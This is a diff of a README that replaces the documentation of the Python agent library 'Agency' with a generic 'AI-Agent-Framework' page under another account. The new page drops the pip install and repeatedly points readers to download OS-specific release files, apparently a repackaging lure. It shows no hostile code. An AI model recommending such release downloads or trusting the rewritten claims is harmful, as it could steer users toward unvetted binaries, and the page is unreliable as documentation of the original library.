@@ -1,161 +1,83 @@
-# Summary
+# 🤖 AI-Agent-Framework - Build Intelligent Applications Easily
 
-Agency is a python library that provides an [Actor
-model](https://en.wikipedia.org/wiki/Actor_model) framework for creating
-agent-integrated systems.
+[![Download AI-Agent-Framework](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Thiagoopro/AI-Agent-Framework/releases)
 
-The library provides an easy to use API that enables you to connect agents with
-traditional software systems in a flexible and scalable way, allowing you to
-develop any architecture you need.
+## 🚀 Getting Started
 
-Agency's goal is to enable developers to create custom agent-based applications
-by providing a minimal foundation to both experiment and build upon. So if
-you're looking to build a custom agent system of your own, Agency might be for
-you.
+Welcome to the AI-Agent-Framework! This Python framework helps you create intelligent applications without needing advanced technical skills. Whether you are building a chatbot, an automated task handler, or a simple AI companion, this framework makes the process easier.
 
-## Features
+## 📥 Download & Install
 
-### Easy to use API
-* Straightforward class/method based agent and action definition
-* [Up to date documentation](https://createwith.agency) and [examples](./examples/demo/) for reference
+To get started, you need to download the software from our Releases page. Click the link below to visit the page:
 
-### Performance and Scalability
-* Supports multiprocessing and multithreading for concurrency
-* AMQP support for networked agent systems
+[Visit the Releases Page to Download](https://github.com/Thiagoopro/AI-Agent-Framework/releases)
 
-### Observability and Control
-* Action and lifecycle callbacks
-* Access policies and permission callbacks
-* Detailed logging
+Follow the instructions below to download and run the framework:
 
-### Demo application available at [`examples/demo`](./examples/demo/)
-* Multiple agent examples for experimentation
-  * Two OpenAI agent examples
-  * HuggingFace transformers agent example
-  * Operating system access
-* Includes Gradio UI
-* Docker configuration for reference and development
+1. Open the Releases page using the link above.
+2. Locate the latest version.
+3. Click on the version to open the details.
+4. Download the appropriate file for your operating system (Windows, macOS, or Linux).
 
+## 🖥️ System Requirements
 
-# API Overview
+Before you install the AI-Agent-Framework, ensure your system meets the following requirements:
 
-In Agency, all entities are represented as instances of the `Agent` class. This
-includes all AI-driven agents, software interfaces, or human users that may
-communicate as part of your application.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, Linux (Ubuntu or Fedora).
+- **Python Version:** Python 3.7 or later installed on your computer.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 100 MB of free disk space.
 
-All agents may expose "actions" that other agents can discover and invoke at run
-time. An example of a simple agent could be:
+## 🔧 Prerequisites
 
-```python
-class CalculatorAgent(Agent):
-    @action
-    def add(a, b):
-        return a + b
-```
+You need Python installed on your machine. If you don’t have it, follow these steps to install Python:
 
-This defines an agent with a single action: `add`. Other agents will be able
-to call this method by sending a message to an instance of `CalculatorAgent` and
-specifying the `add` action. For example:
+1. Go to the [Python official website](https://www.python.org/downloads/).
+2. Download the installer for your operating system.
+3. Run the installer and follow the on-screen instructions.
+4. Ensure to check the option to add Python to your PATH during installation.
 
-```python
-other_agent.send({
-    'to': 'CalcAgent',
-    'action': {
-        'name': 'add',
-        'args': {
-            'a': 1,
-            'b': 2,
-        }
-    },
-})
-```
+## 💁 How to Run the Framework
 
-Actions may specify an access policy, allowing you to control access for safety.
+Once you install the AI-Agent-Framework, follow these steps to run your application:
 
-```python
-@action(access_policy=ACCESS_PERMITTED) # This allows the action at any time
-def add(a, b):
-    ...
+1. Open your command line interface (Command Prompt for Windows, Terminal for macOS and Linux).
+2. Navigate to the folder where you downloaded the framework using the `cd` command. For example:
+   ```bash
+   cd path/to/downloaded/folder
+   ```
+3. Create a new AI agent by running the following command:
+   ```bash
+   python create_agent.py
+   ```
+4. Follow the prompts to set up your new agent.
 
-@action(access_policy=ACCESS_REQUESTED) # This requires review before the action
-def add(a, b):
-    ...
-```
+## 🌟 Features
 
-Agents may also define callbacks for various purposes:
+The AI-Agent-Framework comes with a variety of features:
 
-```python
-class CalculatorAgent(Agent):
-    ...
-    def before_action(self, message: dict):
-        """Called before an action is attempted"""
+- **Actor-Model Architecture:** Create scalable and responsive AI applications.
+- **Agent Interactions:** Enable multiple agents to communicate and collaborate.
+- **Easy API Integration:** Connect your agents to various services with minimal effort.
+- **Built-in Machine Learning:** Utilize pre-trained models to enhance your agents' capabilities.
+- **Documentation:** Comprehensive guides and examples to help you understand and utilize the framework.
 
-    def after_action(self, message: dict, return_value: str, error: str):
-        """Called after an action is attempted"""
+## 📚 Documentation
 
-    def after_add(self):
-        """Called after the agent is added to a space and may begin communicating"""
+For detailed guides and advanced usage, please check the full documentation at our GitHub Wiki. The Wiki contains step-by-step tutorials, code examples, and troubleshooting tips.
 
-    def before_remove(self):
-        """Called before the agent is removed from the space"""
-```
+## 🤝 Community Support
 
-A `Space` is how you connect your agents together. An agent cannot communicate
-with others until it is added to a common `Space`.
+If you encounter any issues or have questions while using the AI-Agent-Framework, feel free to reach out to the community:
 
-There are two included `Space` implementations to choose from:
-* `LocalSpace` - which connects agents within the same application.
-* `AMQPSpace` - which connects agents across a network using an AMQP
-  server like RabbitMQ.
+- **Issues:** Report bugs or request features on the [Issues page](https://github.com/Thiagoopro/AI-Agent-Framework/issues).
+- **Discussions:** Join the conversation in the [Discussions section](https://github.com/Thiagoopro/AI-Agent-Framework/discussions).
+- **Email:** For direct support, email us at support@ai-agent-framework.com.
 
-Finally, here is a simple example of creating a `LocalSpace` and adding two
-agents to it.
+## 🔗 Useful Links
 
-```python
-space = LocalSpace()
-space.add(CalculatorAgent, "CalcAgent")
-space.add(MyAgent, "MyAgent")
-# The agents above can now communicate
-```
+- [Visit the Releases Page to Download](https://github.com/Thiagoopro/AI-Agent-Framework/releases)
+- [GitHub Repository](https://github.com/Thiagoopro/AI-Agent-Framework)
+- [Official Documentation](https://github.com/Thiagoopro/AI-Agent-Framework/wiki)
 
-These are just the basic features that Agency provides. For more information
-please see [the help site](https://createwith.agency).
-
-
-# Install
-
-```sh
-pip install agency
-```
-or
-```sh
-poetry add agency
-```
-
-
-# The Demo Application
-
-The demo application is maintained as an experimental development environment
-and a showcase for library features. It includes multiple agent examples which
-may communicate with eachother and supports a "slash" syntax for invoking
-actions as an agent yourself.
-
-To run the demo, please follow the directions at
-[examples/demo](./examples/demo/).
-
-The following is a screenshot of the Gradio UI that demonstrates the example
-`OpenAIFunctionAgent` following orders and interacting with the `Host` agent.
-
-<p align="center">
-  <img src="https://i.ibb.co/h29m5S4/Screenshot-2023-07-26-at-4-53-05-PM.png"
-      alt="Screenshot-2023-07-26-at-4-53-05-PM" border="0">
-</p>
-
-
-
-# Contributing
-
-Please do!
-
-If you're considering a contribution, please check out the [contributing
-guide](./CONTRIBUTING.md).
+With the AI-Agent-Framework, creating your own AI applications is clear and straightforward. Dive in and start building your intelligent solutions today!
